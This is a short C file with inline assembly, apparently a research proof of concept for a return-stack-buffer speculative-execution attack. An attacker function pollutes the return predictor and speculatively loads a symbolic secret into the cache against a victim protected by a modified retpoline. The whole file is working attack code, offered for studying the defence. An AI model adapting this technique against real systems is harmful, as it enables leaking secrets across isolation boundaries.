



#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int secret = 83; // Again secret will be kept symbolic so that there is a difference and not just 83 or S as output.
void __attribute__((noinline)) pollute_rsb() {
	asm volatile("pop %%rax\n" : : : "rax"); // For our case actually not necessary but also not wrong
	asm("jmp return_label"); // jmp to victim
}

void __attribute ((noinline)) attacker() {
	pollute_rsb(); // call function never return below
	//architecturally never executed
	asm volatile("movq (%0), %%rax\n" : : "c"(secret) : "rax"); //cache_encode function of transfail
}

void __attribute__((noinline)) victim() {
	asm("return_label:");
	asm ("popq %rbp"); // only ret instruction is replaced by retpoline, we need to correctly pop the stack frame before
	asm("call return_new"); // The modified retpoline defense in retspec trapping speculation in infinte loop
	asm volatile("speculate:");
	asm volatile("nop");
	asm volatile ("jmp speculate");
	asm volatile("return_new:");
	asm volatile ("add $8, %rsp\t\n");
	asm volatile ("ret");
}

int main (int argc, char **argv) {
	attacker();
}




